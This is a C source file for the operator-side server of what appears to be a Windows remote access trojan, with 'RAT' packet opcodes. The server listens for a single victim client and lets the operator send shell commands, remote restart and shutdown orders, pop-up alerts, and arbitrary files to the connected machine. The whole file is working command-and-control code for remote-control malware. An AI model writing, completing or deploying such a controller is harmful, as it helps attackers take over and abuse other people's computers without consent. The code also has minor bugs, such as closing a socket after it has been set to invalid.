#include "server.h"

#include "log.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

static void init_server_socket(SOCKET *server) {
  AddrInfo hints;
  AddrInfo *result = NULL;
  setaddrinfo(&hints, SERVER);
  if (getaddrinfo(NULL, DEFAULT_PORT, &hints, &result) != 0) {
    LOG_ERR("getaddrinfo failed %d", WSAGetLastError());
    *server = INVALID_SOCKET;
    return;
  }
  *server = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
  if (*server == INVALID_SOCKET) {
    printf("error: %d\n", WSAGetLastError());
    freeaddrinfo(result);
    return;
  }
  // binding the socket
  if (bind(*server, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
    printf("bind failed, error: %d\n", WSAGetLastError());
    freeaddrinfo(result);
    closesocket(*server);
    *server = INVALID_SOCKET;
    return;
  }
  freeaddrinfo(result);
  result = NULL;
  // listening
  printf("listening...\n");
  if (listen(*server, SOMAXCONN) == SOCKET_ERROR) {
    printf("listen failed, error: %d\n", WSAGetLastError());
    *server = INVALID_SOCKET;
    closesocket(*server);
    return;
  }
}

static SOCKET accept_client(SOCKET server) {
  // accepting a connection
  LOG_DEBUG("accetping...\n");
  SOCKET client = accept(server, NULL, NULL);
  if (client == INVALID_SOCKET) {
    LOG_ERR("accept failed, error: %d", WSAGetLastError());
    closesocket(server);
    return INVALID_SOCKET;
  }
  LOG_DEBUG("accepted\n");
  closesocket(server);
  return client;
}

static void *read_ratpacket(ratpacket_t *p) {
  puts("enter opcode:");
#define _(s, v, n) printf("%d. %s\n", ((v) + 1), n);
  FOREACH_RAT_OPCODE
#undef _
  if (fgets((char *)p, RAT_OPCODE_MAX_LEN + 2, stdin) == NULL) {
    return NULL;
  }
  p->op = atoi((char *)p) - 1;
  puts("enter data:");
  fgets((char *)p->data, DEFAULT_BUFLEN - sizeof(*p), stdin);
  p->data_len = strlen((char *)p->data) + 1;
  return p;
}

static void read_alert(ratpacket_t *p) {
  alert_t *alert = (alert_t *)&p->data;
  puts("enter title:");
  fgets(alert->title, sizeof(alert->title), stdin);
  puts("enter text:");
  fgets(alert->text, sizeof(alert->text), stdin);
  puts("enter amount:");
  char num_buf[9 + 2]; // max int len
  fgets(num_buf, sizeof(num_buf), stdin);
  alert->amount = atoi(num_buf);
}

static ratpacket_t *read_file_entry() {
  ratpacket_t *p = NULL;
  FILE *f;
  char name[256];
  puts("enter file path:");
  fgets(name, sizeof(name), stdin);
  int path_len = strlen(name);
  if (name[path_len - 1] == '\n')
    name[path_len - 1] = '\0';
  if (fopen_s(&f, name, "rb")) {
    LOG_DEBUG("read path %s failed");
    return p;
  }
  puts("enter client file name:");
  fgets(name, sizeof(name), stdin);
  int name_len = strlen(name);
  if (name[name_len - 1] == '\n') {
    name[name_len - 1] = '\0';
  } else
    ++name_len;
  fseek(f, 0, SEEK_END);
  int file_size = ftell(f);
  fseek(f, 0, SEEK_SET);
  p = malloc(sizeof(*p) + name_len + file_size);
  if (!p) {
    LOG_DEBUG("malloc failed");
    return p;
  }
  p->op = RAT_PACKET_FILE;
  p->data_len = file_size + name_len;
  memcpy(p->data, name, name_len);
  int read_result = fread(p->data + name_len, 1, file_size, f);
  if (read_result != file_size) {
    free(p);
    LOG_DEBUG("fread expected %d bytes but got %d", file_size, read_result);
    return NULL;
  }
  return p;
}

static void handle_client(SOCKET client) {
  char bufc[DEFAULT_BUFLEN], bufs[DEFAULT_BUFLEN];
  memset(bufc, 0, DEFAULT_BUFLEN);
  memset(bufs, 0, DEFAULT_BUFLEN);
  ratpacket_t *ps = (ratpacket_t *)bufs;
  ratpacket_t *pc = (ratpacket_t *)bufc;
  while (1) {
    if (!read_ratpacket(ps)) {
      LOG_ERR("read rat packet from user failed");
      break;
    }
    switch (ps->op) {
    case RAT_PACKET_DISCONNECT:
      return;
    case RAT_PACKET_ECHO:
      printf("%s", pc->data);
      if (send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0) ==
          SOCKET_ERROR) {
        LOG_ERR("send failed with %d", WSAGetLastError());
        return;
      }
      LOG_DEBUG("sent");
      int recbytes = recv(client, (char *)pc, sizeof(*pc), 0);
      if (recbytes == 0) {
        LOG_DEBUG("connection closed");
        break;
      }
      if (recbytes < 0) {
        LOG_ERR("recv failed with %d", WSAGetLastError());
        break;
      }
      recbytes = recv(client, (char *)pc->data, pc->data_len, 0);
      if (recbytes == 0) {
        LOG_DEBUG("connection closed");
        break;
      }
      if (recbytes < 0) {
        LOG_ERR("recv failed with %d", WSAGetLastError());
        break;
      }
      printf("%s", pc->data);
      break;
    case RAT_PACKET_RESTART:
    case RAT_PACKET_SHUTDOWN:
    case RAT_PACKET_CMD:
      if (send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0) ==
          SOCKET_ERROR) {
        LOG_ERR("send failed with %d", WSAGetLastError());
      }
      break;
    case RAT_PACKET_ALERT:
      ps->data_len = sizeof(alert_t);
      read_alert(ps);
      alert_t *alert = (alert_t *)ps->data;
      LOG_DEBUG("received alert title=\"%s\" text\"%s\" amount=\"%d\"",
                alert->title, alert->text, alert->amount);
      if (send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0) ==
          SOCKET_ERROR) {
        LOG_ERR("send failed with %d", WSAGetLastError());
        break;
      }
      break;
    case RAT_PACKET_FILE:
      ps = read_file_entry();
      if (!ps) {
        LOG_ERR("read file entry failed");
        break;
      }
      int send_result = send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0);
      if (send_result == SOCKET_ERROR) {
        LOG_ERR("send failed with %d", WSAGetLastError());
      } else {
        LOG_DEBUG("sent file entry with size %d", ps->data_len);
      }
      free(ps);
      ps = (ratpacket_t *)bufs;
      break;
    default:
      LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(ps->op),
                ps->op);
      break;
    }
  }
}

int server() {
  SOCKET server;
  init_server_socket(&server);
  if (server == INVALID_SOCKET) {
    LOG_ERR("init server socket failed");
    return 1;
  }
  SOCKET client = accept_client(server);
  if (client == INVALID_SOCKET) {
    return 1;
  }
  handle_client(client);
  if (shutdown(client, SD_SEND) == SOCKET_ERROR) {
    printf("shutdown failed, error: %d", WSAGetLastError());
    closesocket(client);
    return 1;
  }
  closesocket(client);
  return 0;
}